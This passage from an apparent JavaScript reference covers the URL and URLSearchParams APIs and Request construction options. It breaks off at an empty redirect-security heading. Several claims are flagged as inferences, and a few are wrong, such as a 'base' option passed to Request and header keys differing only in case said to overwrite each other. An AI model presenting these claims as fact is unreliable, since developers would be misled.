new URL('#section-2', 'https://example.com/page?x=1');
// Results in: https://example.com/page?x=1#section-2
```

Relative paths without leading slashes append to the base path's directory. Paths with leading slashes replace the entire path component. The base URL must be absolute—relative bases aren't supported.

Path normalization occurs during resolution, removing redundant `.` segments and resolving `..` segments to parent directories:

```javascript
new URL('../api/users', 'https://example.com/old/path/');
// Results in: https://example.com/old/api/users
```

### Username and Password in URLs

URLs support embedded authentication credentials through `username` and `password` properties, appearing in the format `protocol://username:password@hostname/path`.

```javascript
const url = new URL('https://example.com');
url.username = 'admin';
url.password = 'secret';
// Results in: https://admin:secret@example.com/
```

[Inference] Embedding credentials in URLs is generally discouraged for security reasons—credentials appear in browser history, server logs, and referrer headers. Modern authentication uses headers (Authorization) or cookies rather than URL credentials.

Browsers often display warnings or strip credentials from visible URLs while still sending them in requests. Some contexts, particularly HTTPS to HTTP transitions, may refuse to send credentials to prevent credential exposure.

Reading credentials from externally provided URLs requires explicit extraction:

```javascript
const externalUrl = new URL(untrustedInput);
if (externalUrl.username || externalUrl.password) {
  // Handle or strip credentials
}
```

### Port Handling

The `port` property represents the port number as a string. Empty string indicates the default port for the protocol (80 for HTTP, 443 for HTTPS). Setting port to protocol defaults automatically clears the port from the serialized URL.

```javascript
const url = new URL('https://example.com:443/path');
console.log(url.port); // '443'
url.port = ''; // Removes explicit port
console.log(url.href); // 'https://example.com/path'
```

Non-numeric port values or invalid port numbers may be rejected or cause errors during assignment. Valid ports range from 1 to 65535.

The `host` property combines hostname and port as `hostname:port`, while `hostname` excludes the port. Setting `host` with a port string updates both hostname and port atomically:

```javascript
url.host = 'newhost.com:8080';
console.log(url.hostname); // 'newhost.com'
console.log(url.port); // '8080'
```

### Protocol Switching

Changing the `protocol` property updates the URL scheme. The protocol must include the trailing colon or it's added automatically:

```javascript
url.protocol = 'wss:'; // WebSocket secure
url.protocol = 'wss'; // Also valid, colon added automatically
```

Protocol changes may affect default port interpretation. Switching from `http:` to `https:` with an explicit port 80 leaves port 80 in place, creating `https://example.com:80`, which is unusual but valid.

[Inference] Security policies in browsers may restrict protocol changes in certain contexts, particularly changing from HTTPS to HTTP for security reasons. Content Security Policy and mixed content rules apply.

### Converting Between URL and String

The `toString()` and `toJSON()` methods serialize URLs to strings, equivalent to accessing the `href` property. This enables automatic string conversion in contexts expecting strings:

```javascript
const url = new URL('https://example.com/path');
console.log(url.toString()); // 'https://example.com/path'
console.log(String(url)); // Same result
console.log(`Navigating to ${url}`); // Template literal conversion
```

JSON serialization with `JSON.stringify()` calls `toJSON()`, which returns the URL string:

```javascript
const data = { endpoint: url };
JSON.stringify(data); // {"endpoint":"https://example.com/path"}
```

Converting strings to URLs for manipulation and back to strings is a common pattern for URL transformation:

```javascript
function addParam(urlString, key, value) {
  const url = new URL(urlString);
  url.searchParams.set(key, value);
  return url.toString();
}
```

### URLSearchParams Independence

URLSearchParams can be instantiated independently from URL objects, useful for working with query strings in isolation or building form data:

```javascript
const params = new URLSearchParams();
params.set('search', 'javascript');
params.set('category', 'tutorial');

const queryString = params.toString();
// Use in fetch or form submission
```

Detached URLSearchParams instances don't automatically synchronize with URLs. Changes to a detached instance don't affect the URL it originated from:

```javascript
const url = new URL('https://example.com?x=1');
const params = new URLSearchParams(url.search);
params.set('y', '2');
console.log(url.search); // Still '?x=1'
console.log(params.toString()); // 'x=1&y=2'
```

Synchronization requires explicit assignment back to the URL:

```javascript
url.search = params.toString();
```

### Parameter Sorting

URLSearchParams maintains insertion order for parameters. The `sort()` method arranges parameters alphabetically by key, useful for generating canonical URLs or cache keys:

```javascript
const params = new URLSearchParams('z=3&a=1&m=2');
params.sort();
console.log(params.toString()); // 'a=1&m=2&z=3'
```

Sorting occurs in-place, modifying the URLSearchParams instance directly. Multiple values for the same key remain grouped together after sorting, maintaining their relative order.

Sorted parameters enable consistent URL comparisons and cache key generation:

```javascript
function getCacheKey(url) {
  const parsed = new URL(url);
  parsed.searchParams.sort();
  return parsed.toString();
}
```

### Working with FormData

URLSearchParams and FormData serve similar purposes but differ in encoding and use cases. URLSearchParams handles URL query parameters with `application/x-www-form-urlencoded` encoding, while FormData manages `multipart/form-data` for file uploads and form submissions.

Converting between them requires iteration:

```javascript
// FormData to URLSearchParams
const formData = new FormData(formElement);
const params = new URLSearchParams();
for (const [key, value] of formData) {
  if (typeof value === 'string') {
    params.append(key, value);
  }
}

// URLSearchParams to FormData
const formData = new FormData();
for (const [key, value] of params) {
  formData.append(key, value);
}
```

[Inference] FormData with file inputs can't directly convert to URLSearchParams since files aren't representable as URL-encoded strings. The conversion only preserves string values.

### Immutability Patterns

URL objects are mutable—property modifications change the object in place. Creating immutable URL transformations requires cloning:

```javascript
function withParam(url, key, value) {
  const newUrl = new URL(url.href);
  newUrl.searchParams.set(key, value);
  return newUrl;
}

const original = new URL('https://example.com?x=1');
const modified = withParam(original, 'y', '2');
// original unchanged
```

Functional approaches to URL building maintain immutability throughout transformation chains:

```javascript
const buildUrl = (base) => ({
  setPath: (path) => {
    const url = new URL(base);
    url.pathname = path;
    return buildUrl(url.href);
  },
  addParam: (key, value) => {
    const url = new URL(base);
    url.searchParams.set(key, value);
    return buildUrl(url.href);
  },
  build: () => base
});

const finalUrl = buildUrl('https://api.example.com')
  .setPath('/users')
  .addParam('active', 'true')
  .addParam('limit', '50')
  .build();
```

### Special Character Handling

Certain characters have special meaning in URLs and require careful handling. The `#` character separates the fragment, `?` begins the query string, and `&` separates parameters. Using these literally in pathnames or parameter values requires percent-encoding.

The URL API handles most encoding automatically, but manual encoding may be necessary when constructing path segments:

```javascript
// Pathname with query-like characters
const filename = 'report?final&approved.pdf';
url.pathname = `/files/${encodeURIComponent(filename)}`;
// Results in: /files/report%3Ffinal%26approved.pdf
```

Parameter names and values encode automatically through URLSearchParams:

```javascript
params.set('search', 'price>100'); // Encodes >
params.set('filter', 'status=active'); // Encodes =
```

Unicode characters encode as UTF-8 byte sequences:

```javascript
params.set('name', '日本語'); // Properly encodes multi-byte characters
```

### Template URL Construction

Building URLs from templates with variable substitution benefits from helper functions:

```javascript
function buildUrl(template, params, query = {}) {
  // Replace path parameters
  let path = template;
  for (const [key, value] of Object.entries(params)) {
    path = path.replace(`:${key}`, encodeURIComponent(value));
  }
  
  const url = new URL(path, 'https://api.example.com');
  
  // Add query parameters
  for (const [key, value] of Object.entries(query)) {
    if (value !== undefined && value !== null) {
      url.searchParams.set(key, value);
    }
  }
  
  return url.toString();
}

buildUrl('/users/:id/posts/:postId', 
  { id: 123, postId: 456 },
  { include: 'comments', limit: 10 }
);
// https://api.example.com/users/123/posts/456?include=comments&limit=10
```

Template systems can handle optional parameters, default values, and validation before URL construction.

### URL Parsing from Current Location

Browser environments provide `window.location` as a Location object with similar properties to URL but with live updates. Converting Location to URL enables manipulation without affecting browser state:

```javascript
const currentUrl = new URL(window.location.href);
currentUrl.searchParams.set('page', '2');
// Doesn't navigate, just creates modified URL
```

Relative URL construction against the current page:

```javascript
const relativeUrl = new URL('/api/data', window.location.href);
// Resolves relative to current page origin and path
```

Extracting current query parameters for modification:

```javascript
const params = new URLSearchParams(window.location.search);
params.delete('tempParam');
const cleanedUrl = `${window.location.pathname}?${params.toString()}`;
```

---

## Query String Handling

### URLSearchParams Interface

The URLSearchParams interface defines utility methods to work with the query string of a URL.

**Key characteristics:**

- URLSearchParams objects are iterable, so they can directly be used in a for...of structure to iterate over key/value pairs in the same order as they appear in the query string
- Although URLSearchParams is functionally similar to a Map, when iterating, it may suffer from some pitfalls that Map doesn't encounter due to how it's implemented

---

### Constructor

#### URLSearchParams()

**Syntax:**

```javascript
new URLSearchParams()
new URLSearchParams(init)
```

**Parameter types:**

1. **String** - A query string (with or without leading `?`)
2. **Object literal** - Key-value pairs
3. **Array of arrays** - Sequence of name-value pairs
4. **FormData** - FormData object
5. **Another URLSearchParams** - Clones the object

**Examples:**

```javascript
// From query string
const params1 = new URLSearchParams('foo=1&bar=2');
const params2 = new URLSearchParams('?foo=1&bar=2'); // Leading ? is stripped

// From object literal
const params3 = new URLSearchParams({ foo: '1', bar: '2' });

// From array of arrays
const params4 = new URLSearchParams([
  ['foo', '1'],
  ['bar', '2']
]);

// From URL object's search property
const url = new URL('https://example.com?foo=1&bar=2');
const params5 = new URLSearchParams(url.search);

// From FormData
const form = document.querySelector('form');
const formData = new FormData(form);
const params6 = new URLSearchParams(formData);
```

**Important behaviors:**

- The URLSearchParams constructor does not parse full URLs. However, it will strip an initial leading ? off of a string, if present
- The URLSearchParams constructor interprets plus signs (+) as spaces, which might cause problems

---

### Instance Properties

#### `size` (Read-only)

**Type:** Number  
Indicates the total number of search parameter entries

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
console.log(params.size); // 3
```

---

### Instance Methods

#### Reading Parameters

##### `get(name)`

Returns the first value associated with the given search parameter

**Returns:** String or `null` if not found

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
console.log(params.get('foo')); // '1' (first value only)
console.log(params.get('baz')); // null
```

##### `getAll(name)`

Returns all the values associated with a given search parameter

**Returns:** Array of strings (empty array if not found)

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
console.log(params.getAll('foo')); // ['1', '3']
console.log(params.getAll('baz')); // []
```

##### `has(name)` / `has(name, value)`

Returns a boolean value indicating if a given parameter, or parameter and value pair, exists

```javascript
const params = new URLSearchParams('foo=1&bar=2');
console.log(params.has('foo'));        // true
console.log(params.has('foo', '1'));   // true
console.log(params.has('foo', '2'));   // false
console.log(params.has('baz'));        // false
```

#### Modifying Parameters

##### `set(name, value)`

Sets the value associated with a given search parameter to the given value. If there are several values, the others are deleted

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
params.set('foo', '999');
console.log(params.toString()); // 'foo=999&bar=2'

// Creates new parameter if it doesn't exist
params.set('baz', '4');
console.log(params.toString()); // 'foo=999&bar=2&baz=4'
```

##### `append(name, value)`

Appends a specified key/value pair as a new search parameter

```javascript
const params = new URLSearchParams('foo=1&bar=2');
params.append('foo', '3');
console.log(params.toString()); // 'foo=1&bar=2&foo=3'
```

**Note:** If the same key is appended multiple times, it will appear in the parameter string multiple times for each value

##### `delete(name)` / `delete(name, value)`

Deletes search parameters that match a name, and optional value, from the list of all search parameters

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');

// Delete all instances of a key
params.delete('foo');
console.log(params.toString()); // 'bar=2'

// Delete specific key-value pair
const params2 = new URLSearchParams('foo=1&bar=2&foo=3');
params2.delete('foo', '1');
console.log(params2.toString()); // 'bar=2&foo=3'
```

#### Utility Methods

##### `sort()`

Sorts all key/value pairs, if any, by their keys

```javascript
const params = new URLSearchParams('z=3&a=1&m=2');
params.sort();
console.log(params.toString()); // 'a=1&m=2&z=3'
```

##### `toString()`

Returns a string containing a query string suitable for use in a URL

```javascript
const params = new URLSearchParams({ foo: '1', bar: '2' });
console.log(params.toString()); // 'foo=1&bar=2'
```

#### Iteration Methods

##### `keys()`

Returns an iterator allowing iteration through all keys of the key/value pairs contained in this object

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
for (const key of params.keys()) {
  console.log(key);
}
// Output: 'foo', 'bar', 'foo'
```

##### `values()`

Returns an iterator allowing iteration through all values of the key/value pairs contained in this object

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');
for (const value of params.values()) {
  console.log(value);
}
// Output: '1', '2', '3'
```

##### `entries()`

Returns an iterator allowing iteration through all key/value pairs contained in this object in the same order as they appear in the query string

```javascript
const params = new URLSearchParams('foo=1&bar=2');
for (const [key, value] of params.entries()) {
  console.log(`${key}: ${value}`);
}
// Output: 'foo: 1', 'bar: 2'
```

##### `forEach(callback)`

Allows iteration through all values contained in this object via a callback function

```javascript
const params = new URLSearchParams('foo=1&bar=2');
params.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});
```

##### Direct iteration

```javascript
const params = new URLSearchParams('foo=1&bar=2');

// These two are equivalent
for (const [key, value] of params) {
  console.log(`${key}: ${value}`);
}

for (const [key, value] of params.entries()) {
  console.log(`${key}: ${value}`);
}
```

---

### Encoding Behavior

#### Percent Encoding

URLSearchParams objects percent-encode anything in the application/x-www-form-urlencoded percent-encode set (which contains all code points except ASCII alphanumeric, *, -, ., and _), and encode U+0020 SPACE as +

**Key points:**

- It only handles percent-encoding when serializing and deserializing full URL search params syntax. When interacting with individual keys and values, you always use the unencoded version

```javascript
// Percent-encoding is decoded when parsing
const params = new URLSearchParams('%24%25%26=%28%29%2B');
console.log([...params]); // [['$%&', '()+']]

// Use decoded keys to retrieve values
console.log(params.get('$%&')); // '()+'
console.log(params.get('%24%25%26')); // null

// Use unencoded keys and values when setting
params.append('$%&$#@+', '$#&*@#()+');

// Percent-encoding is applied when serializing
console.log(params.toString());
// '%24%25%26=%28%29%2B&%24%25%26%24%23%40%2B=%24%23%26*%40%23%28%29%2B'
```

**Warning:** If you append a key/value pair with a percent-encoded key, that key is treated as unencoded and is encoded again:

```javascript
const params = new URLSearchParams();
params.append('%24%26', 'value');
console.log(params.toString()); // '%2524%2526=value'
```

#### Preserving Plus Signs

The URLSearchParams constructor interprets plus signs (+) as spaces, which might cause problems

**Problem:**

```javascript
const rawData = '\x13à\x17@\x1F\x80';
const base64Data = btoa(rawData); // 'E+AXQB+A'

const searchParams = new URLSearchParams(`bin=${base64Data}`);
const binQuery = searchParams.get('bin'); // 'E AXQB A' - plus became space!

console.log(atob(binQuery) === rawData); // false
```

**Solution:** Never construct URLSearchParams using dynamically interpolated strings. Use `append()` instead:

```javascript
const rawData = '\x13à\x17@\x1F\x80';
const base64Data = btoa(rawData); // 'E+AXQB+A'

const searchParams = new URLSearchParams();
searchParams.append('bin', base64Data); // 'bin=E%2BAXQB%2BA'
const binQuery = searchParams.get('bin'); // 'E+AXQB+A'

console.log(atob(binQuery) === rawData); // true
```

---

### Special Cases

#### Empty Value vs. No Value

URLSearchParams doesn't distinguish between a parameter with nothing after the =, and a parameter that doesn't have a = altogether

```javascript
const emptyVal = new URLSearchParams('foo=&bar=baz');
console.log(emptyVal.get('foo')); // ''

const noEquals = new URLSearchParams('foo&bar=baz');
console.log(noEquals.get('foo')); // '' (same result)
console.log(noEquals.toString()); // 'foo=&bar=baz'
```

#### Duplicate Parameters

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');

console.log(params.has('foo'));      // true
console.log(params.get('foo'));      // '1' (first value only)
console.log(params.getAll('foo'));   // ['1', '3'] (all values)
console.log(params.toString());      // 'foo=1&bar=2&foo=3'
```

---

### Integration with URL

#### URL.searchParams Property

The URL.searchParams property exposes the URL's search string as a URLSearchParams object. When updating this URLSearchParams, the URL's search is updated with its serialization

```javascript
const url = new URL('https://example.com?foo=1&bar=2');
const params = url.searchParams;

params.set('baz', '3');
params.has('baz'); // true
console.log(params.toString()); // 'foo=1&bar=2&baz=3'
console.log(url.href); // 'https://example.com/?foo=1&bar=2&baz=3'
```

#### Encoding Differences

URL.search encodes a subset of characters that URLSearchParams does, and encodes spaces as %20 instead of +. This may cause some surprising interactions—if you update searchParams, even with the same values, the URL may be serialized differently

```javascript
const url = new URL('https://example.com/?a=b ~');
console.log(url.href);                    // 'https://example.com/?a=b%20~'
console.log(url.searchParams.toString()); // 'a=b+%7E'

// Updating searchParams changes URL's serialization
url.searchParams.sort();
console.log(url.href); // 'https://example.com/?a=b+%7E'
```

---

### Common Patterns

#### Reading Current Page's Query String

```javascript
// Get query params from current page
const params = new URLSearchParams(window.location.search);
const userId = params.get('userId');
const sortBy = params.get('sort');
```

#### Building API Request URLs

```javascript
const baseUrl = 'https://api.example.com/search';
const params = new URLSearchParams({
  q: 'javascript',
  page: '1',
  limit: '20'
});

const url = `${baseUrl}?${params.toString()}`;
// 'https://api.example.com/search?q=javascript&page=1&limit=20'

// Or use URL constructor
const apiUrl = new URL(baseUrl);
apiUrl.searchParams.set('q', 'javascript');
apiUrl.searchParams.set('page', '1');
apiUrl.searchParams.set('limit', '20');
```

#### Converting URLSearchParams to Object

```javascript
const params = new URLSearchParams('foo=1&bar=2&foo=3');

// Simple conversion (loses duplicate keys)
const obj = Object.fromEntries(params.entries());
// { foo: '3', bar: '2' } - only last 'foo' value kept

// Preserve all values
const objWithArrays = {};
for (const [key, value] of params) {
  if (objWithArrays[key]) {
    if (Array.isArray(objWithArrays[key])) {
      objWithArrays[key].push(value);
    } else {
      objWithArrays[key] = [objWithArrays[key], value];
    }
  } else {
    objWithArrays[key] = value;
  }
}
// { foo: ['1', '3'], bar: '2' }
```

#### Updating URL Without Page Reload

```javascript
const params = new URLSearchParams(window.location.search);
params.set('page', '2');
params.set('sort', 'date');

// Update browser URL without reload
window.history.replaceState(
  {},
  '',
  `${window.location.pathname}?${params}`
);
```

#### Using with fetch()

```javascript
const params = new URLSearchParams({
  userId: '123',
  includeDetails: 'true'
});

// GET request
fetch(`https://api.example.com/user?${params}`)
  .then(response => response.json())
  .then(data => console.log(data));

// POST with URLSearchParams as body
fetch('https://api.example.com/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: params.toString()
});
```

---

### TypeScript Definition

```typescript
interface URLSearchParams {
  // Properties
  readonly size: number;
  
  // Methods
  append(name: string, value: string): void;
  delete(name: string, value?: string): void;
  get(name: string): string | null;
  getAll(name: string): string[];
  has(name: string, value?: string): boolean;
  set(name: string, value: string): void;
  sort(): void;
  toString(): string;
  
  // Iteration
  entries(): IterableIterator<[string, string]>;
  keys(): IterableIterator<string>;
  values(): IterableIterator<string>;
  forEach(
    callbackfn: (value: string, key: string, parent: URLSearchParams) => void,
    thisArg?: any
  ): void;
  
  [Symbol.iterator](): IterableIterator<[string, string]>;
}

interface URLSearchParamsConstructor {
  new(init?: string | URLSearchParams | Record<string, string> | [string, string][]): URLSearchParams;
}

declare var URLSearchParams: URLSearchParamsConstructor;
```

---

## Request Object Creation

### Constructor Patterns and Initialization

#### Direct Constructor Instantiation

Request objects instantiate through the `Request` constructor, accepting a URL or existing Request as the first argument and an optional configuration object:

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ key: 'value' })
});
```

The constructor performs several initialization tasks: normalizing the URL, validating method-body combinations, processing headers into a Headers object, and establishing the request's mode, credentials, and cache policies. [Inference] The constructor likely validates that GET and HEAD requests don't include bodies, throwing TypeError for invalid combinations.

#### Request Cloning from Existing Requests

Passing an existing Request to the constructor creates a new Request with inherited properties:

```javascript
const originalRequest = new Request('https://api.example.com/users');

const clonedRequest = new Request(originalRequest, {
  method: 'POST',
  body: JSON.stringify({ name: 'Alice' })
});
```

The new Request inherits all properties from the original unless explicitly overridden in the options object. This enables request templating where base configurations propagate to variations.

#### Cloning with the clone() Method

The `clone()` method creates a deep copy of a Request including its body stream:

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  body: readableStream
});

const cloned = request.clone();
```

Cloning becomes necessary when the same request body needs reading multiple times, since body streams are single-use. The clone creates an independent body stream that can be consumed separately from the original. [Inference] The implementation likely uses the underlying stream's tee() operation to split the body stream into two independent streams.

### URL and Resource Targeting

#### URL Parsing and Normalization

The Request constructor parses the URL string into components, resolving relative URLs against the document's base URL in browser contexts:

```javascript
// Absolute URL
const absolute = new Request('https://api.example.com/users/123');

// Relative URL (browser context)
const relative = new Request('/api/users/123');

// Relative URL with base
const withBase = new Request('../users/123', { base: 'https://api.example.com/posts/' });
```

[Inference] URL normalization includes converting the hostname to lowercase, removing default ports (80 for HTTP, 443 for HTTPS), and resolving path segments like `..` and `.`. Invalid URLs throw TypeError during construction.

#### URL Mutation Immutability

Request objects are immutable after creation. The URL cannot be modified after instantiation:

```javascript
const request = new Request('https://api.example.com/users');
request.url = 'https://other.com/users'; // No effect, url property is read-only
```

URL modifications require creating a new Request with the desired URL, potentially cloning other properties from the original request.

#### URLSearchParams Integration

Query parameters manipulate through URL construction, often combining with URLSearchParams:

```javascript
const params = new URLSearchParams({
  page: 2,
  limit: 50,
  sort: 'name'
});

const request = new Request(`https://api.example.com/users?${params}`);
// URL: https://api.example.com/users?page=2&limit=50&sort=name
```

This pattern separates query parameter logic from URL construction, enabling dynamic parameter building.

### HTTP Method Configuration

#### Method Selection and Constraints

The `method` property specifies the HTTP verb, accepting standard methods (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS) and custom methods:

```javascript
const getRequest = new Request('https://api.example.com/users', {
  method: 'GET'
});

const customRequest = new Request('https://api.example.com/resource', {
  method: 'CUSTOM-METHOD'
});
```

[Inference] The constructor normalizes method names to uppercase. Methods are case-insensitive during construction but stored in uppercase form.

#### Method-Body Validation

GET and HEAD requests cannot include request bodies. [Inference] The constructor throws TypeError when these methods specify a body:

```javascript
// Throws TypeError
const invalidRequest = new Request('https://api.example.com/users', {
  method: 'GET',
  body: JSON.stringify({ data: 'value' })
});
```

This validation enforces HTTP semantic correctness, preventing protocol violations.

#### Safe and Idempotent Method Semantics

[Inference] While the Request constructor doesn't enforce safe or idempotent semantics beyond body validation, the method choice affects browser behavior for caching, prefetching, and CORS preflight decisions. GET, HEAD, and OPTIONS typically trigger different caching and security behaviors than POST, PUT, or DELETE.

### Header Construction and Management

#### Headers Object Creation

Headers initialize through several patterns:

```javascript
// Object literal
const request1 = new Request(url, {
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  }
});

// Headers instance
const headers = new Headers();
headers.append('Content-Type', 'application/json');
headers.append('Authorization', 'Bearer token');

const request2 = new Request(url, {
  headers: headers
});

// Array of tuples
const request3 = new Request(url, {
  headers: [
    ['Content-Type', 'application/json'],
    ['Authorization', 'Bearer token']
  ]
});
```

All patterns create a Headers object internally. The Request's headers property returns a Headers instance that can be manipulated before the request is used.

#### Header Normalization Rules

Header names normalize to lowercase internally, though retrieval is case-insensitive:

```javascript
const request = new Request(url, {
  headers: {
    'Content-Type': 'application/json',
    'content-type': 'text/plain' // Overwrites previous
  }
});

request.headers.get('Content-Type'); // Returns the last set value
request.headers.get('content-type'); // Same value, case-insensitive
```

[Inference] When duplicate headers appear with different casing, the last value typically wins, though some headers like `Set-Cookie` may accumulate multiple values.

#### Forbidden Headers Protection

Certain headers cannot be set programmatically for security reasons. [Inference] The Request constructor or Headers object silently ignores or prevents modification of forbidden headers including:

- `Accept-Charset`
- `Accept-Encoding`
- `Access-Control-Request-Headers`
- `Access-Control-Request-Method`
- `Connection`
- `Content-Length`
- `Cookie`
- `Date`
- `DNT`
- `Expect`
- `Host`
- `Keep-Alive`
- `Origin`
- `Referer`
- `TE`
- `Trailer`
- `Transfer-Encoding`
- `Upgrade`
- `Via`
- Headers starting with `Proxy-` or `Sec-`

These restrictions prevent bypassing browser security mechanisms or corrupting the HTTP message structure.

#### Guard Concept in Headers

Headers objects have internal guards (`immutable`, `request`, `request-no-cors`, `response`, `none`) that control mutability. [Inference] Request headers typically use `request` guard, allowing most modifications except forbidden headers. The guard prevents inappropriate header manipulation based on context.

### Body Construction and Serialization

#### Body Type Compatibility

Request bodies accept multiple data types:

```javascript
// String body
const stringRequest = new Request(url, {
  method: 'POST',
  body: 'plain text data'
});

// Blob body
const blobRequest = new Request(url, {
  method: 'POST',
  body: new Blob(['data'], { type: 'application/octet-stream' })
});

// FormData body
const formData = new FormData();
formData.append('username', 'alice');
formData.append('file', fileBlob);

const formRequest = new Request(url, {
  method: 'POST',
  body: formData
});

// ArrayBuffer body
const buffer = new ArrayBuffer(8);
const bufferRequest = new Request(url, {
  method: 'POST',
  body: buffer
});

// URLSearchParams body
const params = new URLSearchParams({ key: 'value' });
const paramsRequest = new Request(url, {
  method: 'POST',
  body: params
});

// ReadableStream body
const stream = new ReadableStream({
  start(controller) {
    controller.enqueue('chunk1');
    controller.enqueue('chunk2');
    controller.close();
  }
});
const streamRequest = new Request(url, {
  method: 'POST',
  body: stream
});
```

Each body type serializes differently and may automatically set appropriate Content-Type headers if not specified.

#### Automatic Content-Type Inference

[Inference] When body is provided without explicit Content-Type header, the Request constructor infers the type:

- FormData → `multipart/form-data; boundary=...`
- URLSearchParams → `application/x-www-form-urlencoded;charset=UTF-8`
- String → `text/plain;charset=UTF-8`
- Blob → Uses the Blob's type property
- ArrayBuffer/TypedArray → No automatic Content-Type

Explicitly setting Content-Type overrides automatic inference:

```javascript
const request = new Request(url, {
  method: 'POST',
  body: JSON.stringify({ key: 'value' }),
  headers: {
    'Content-Type': 'application/json' // Must set explicitly for JSON strings
  }
});
```

#### Body Stream Consumption and Locking

Request bodies based on ReadableStream are single-use. [Inference] Reading the body locks the stream, preventing subsequent reads:

```javascript
const request = new Request(url, {
  method: 'POST',
  body: 'data'
});

await request.text(); // Consumes the body
await request.json(); // Throws TypeError: body already consumed
```

The `bodyUsed` property indicates consumption status:

```javascript
console.log(request.bodyUsed); // false
await request.text();
console.log(request.bodyUsed); // true
```

Cloning before consumption enables multiple reads:

```javascript
const original = new Request(url, { method: 'POST', body: 'data' });
const clone = original.clone();

await original.text(); // Consumes original
await clone.text();    // Consumes clone independently
```

#### Body Null Handling

Omitting the body or explicitly setting it to null creates a request without a body:

```javascript
const request1 = new Request(url); // No body
const request2 = new Request(url, { body: null }); // Explicitly null body

console.log(request1.body); // null
console.log(request2.body); // null
```

[Inference] The `body` property returns null for bodiless requests, and body reading methods like `text()` or `json()` resolve with empty or default values.

### Request Mode Configuration

#### Mode Values and Security Implications

The `mode` property controls CORS behavior and cross-origin restrictions:

```javascript
// Same-origin only
const sameOrigin = new Request(url, {
  mode: 'same-origin'
});

// CORS enabled
const cors = new Request(url, {
  mode: 'cors'
});

// No CORS (limited functionality)
const noCors = new Request(url, {
  mode: 'no-cors'
});

// Navigation mode (browser navigation)
const navigate = new Request(url, {
  mode: 'navigate'
});
```

**same-origin**: Requests fail if targeting different origins. This mode enforces strict origin checking, throwing TypeError for cross-origin URLs.

**cors**: Enables CORS protocol, sending `Origin` header and respecting CORS headers in responses. Preflight OPTIONS requests occur for non-simple requests.

**no-cors**: Allows cross-origin requests but severely restricts response access. [Inference] Responses have opaque type, preventing JavaScript from reading response body, headers, or status. This mode suits fire-and-forget requests like analytics beacons where response data is unnecessary.

**navigate**: Reserved for browser navigation requests. [Inference] User-created Requests with navigate mode may have limited functionality or throw errors in certain contexts.

#### Mode-Credentials Interaction

Mode affects credentials inclusion logic. [Inference] `same-origin` mode includes credentials automatically for same-origin requests. `cors` mode follows the credentials policy explicitly. `no-cors` mode may include credentials based on specific rules but limits response inspection.

### Credentials Policy Management

#### Credentials Configuration Options

The `credentials` property controls cookie, authorization headers, and TLS client certificate inclusion:

```javascript
// Omit credentials
const omit = new Request(url, {
  credentials: 'omit'
});

// Same-origin credentials only
const sameOrigin = new Request(url, {
  credentials: 'same-origin'
});

// Always include credentials
const include = new Request(url, {
  credentials: 'include'
});
```

**omit**: Never sends credentials regardless of origin. Cookies and authorization headers excluded from the request.

**same-origin**: Includes credentials only when requesting same-origin resources. Cross-origin requests omit credentials.

**include**: Sends credentials for both same-origin and cross-origin requests. For CORS requests, the server must respond with `Access-Control-Allow-Credentials: true` and cannot use wildcard `Access-Control-Allow-Origin`.

#### Third-Party Cookie Implications

[Inference] The `include` credentials mode sends third-party cookies in cross-origin requests, subject to browser privacy settings and SameSite cookie attributes. Browsers increasingly restrict third-party cookies, potentially blocking credentials even when `include` is specified.

#### Authorization Header Handling

[Inference] The credentials policy primarily affects cookies and HTTP authentication. Explicitly set Authorization headers in the headers object typically send regardless of credentials policy, though implementation details may vary.

### Cache Control Strategy

#### Cache Mode Options

The `cache` property determines caching behavior:

```javascript
// Default caching behavior
const defaultCache = new Request(url, {
  cache: 'default'
});

// No cache interaction
const noStore = new Request(url, {
  cache: 'no-store'
});

// Reload from origin
const reload = new Request(url, {
  cache: 'reload'
});

// Validate cached response
const noCache = new Request(url, {
  cache: 'no-cache'
});

// Use cache if available
const forceCache = new Request(url, {
  cache: 'force-cache'
});

// Only use cache, fail if not cached
const onlyIfCached = new Request(url, {
  cache: 'only-if-cached'
});
```

**default**: Follows standard HTTP caching semantics, checking cache freshness and making conditional requests with `If-Modified-Since` or `If-None-Match` headers.

**no-store**: Bypasses cache completely, neither reading from nor writing to cache. Each request fetches fresh from origin.

**reload**: Ignores cache for retrieval but updates cache with the response. Forces fresh fetch while updating cached copy.

**no-cache**: Validates cached responses before use, sending conditional requests to origin. If cached response is still valid (304 Not Modified), uses cached version.

**force-cache**: Uses cached response regardless of freshness. Only fetches from origin if no cached response exists.

**only-if-cached**: Only succeeds if a cached response exists. Fails without network access if cache misses. [Inference] This mode is restricted to `same-origin` mode requests due to security implications of revealing cache state across origins.

#### Cache Mode and Request Mode Interaction

[Inference] `only-if-cached` requires `mode: 'same-origin'`. Using `only-if-cached` with other modes throws TypeError during Request construction, preventing cache-based timing attacks across origins.

### Redirect Handling Configuration

#### Redirect Policy Options

The `redirect` property controls automatic redirect following:

```javascript
// Follow redirects automatically (default)
const follow = new Request(url, {
  redirect: 'follow'
});

// Throw error on redirect
const error = new Request(url, {
  redirect: 'error'
});

// Return redirect response without following
const manual = new Request(url, {
  redirect: 'manual'
});
```

**follow**: Automatically follows HTTP redirects (301, 302, 303, 307, 308), returning the final response. [Inference] Browser implementations typically limit redirect chains to 20 redirects to prevent infinite loops.

**error**: Treats redirects as network errors, rejecting the fetch promise with TypeError. Useful when redirects indicate configuration problems or unexpected behavior.

**manual**: Returns the redirect response (with status 301-308) without following it. Response is opaque, and [Inference] the `Location` header may be inaccessible depending on CORS policy. This mode enables custom redirect logic.

#### Redirect Security Considerations

